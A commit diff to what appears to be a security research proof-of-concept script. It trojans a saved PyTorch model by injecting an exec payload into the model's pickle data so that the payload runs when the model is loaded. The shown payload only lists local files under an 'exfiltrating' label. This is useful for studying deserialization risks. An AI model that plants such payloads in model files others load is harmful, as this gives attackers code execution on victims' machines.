712524841d58c729cf72f4a9890021955d1d4b4b
carsonharmon <carson.harmon@trailofbits.com>
2021-01-26 12:32:21 -0500

    Add exec insertion to pickle

--- example/pytorch_poc.py
+++ example/pytorch_poc.py
@@ -1,4 +1,5 @@
 """
+Tested with python3.9
 This is tutorial code for generating, saving, and loading models in Pytorch
 https://pytorch.org/tutorials/beginner/saving_loading_models.html
 """
@@ -9,6 +10,7 @@ import torch
 from fickling import pickle
 import zipfile
 import shutil
+
 
 # Define model
 class TheModelClass(nn.Module):
@@ -37,7 +39,7 @@ model = TheModelClass()
 # Initialize optimizer
 optimizer = optim.SGD(model.parameters(), lr=0.001, momentum=0.9)
 
-print("="*30)
+print("=" * 30)
 print("Creating and saving original model")
 # Print model's state_dict
 print("Model's state_dict:")
@@ -54,12 +56,15 @@ torch.save(model, "poc.zip")
 shutil.unpack_archive("poc.zip", "/tmp/test_data", "zip")
 pickle_file_path = "/tmp/test_data/archive/data.pkl"
 pickled_file = open(pickle_file_path, "rb")
+# Note, I had some weirdness with multiline strings, but this works okay
+PAYLOAD = """exec("import os \nfor file in os.listdir(): \n\tprint(f'Exfiltrating {file}')")"""
 try:
     pickled = pickle.Pickled.load(pickled_file)
-    print("="*30)
-    print("Inserting print('Hello world!') into serialized model")
-    pickled.insert_python_eval(
-        "print('Hello world!')",
+    print("=" * 30)
+    print("Inserting file exfiltration backdoor into serialized model")
+
+    pickled.insert_python_exec(
+        PAYLOAD,
         run_first=True,
         use_output_as_unpickle_result=False
     )
@@ -68,12 +73,12 @@ try:
     pickled_file = open(pickle_file_path, "wb")
     try:
         pickled.dump(pickled_file)
-        #print("Dumped!")
+        # print("Dumped!")
         pickled_file.close()
         # Repack archive
         shutil.make_archive("test_poc", "zip", "/tmp/test_data", "archive")
-        print("="*30)
         print("Loading trojan archive!")
+        print("=" * 30)
         new_model = torch.load("test_poc.zip")
         new_model.eval()
         optimizer = optim.SGD(new_model.parameters(), lr=0.001, momentum=0.9)
@@ -92,8 +97,3 @@ try:
 
 except Exception as e:
     print("Error loading pickled file! ", e)
-
-
-
-
-
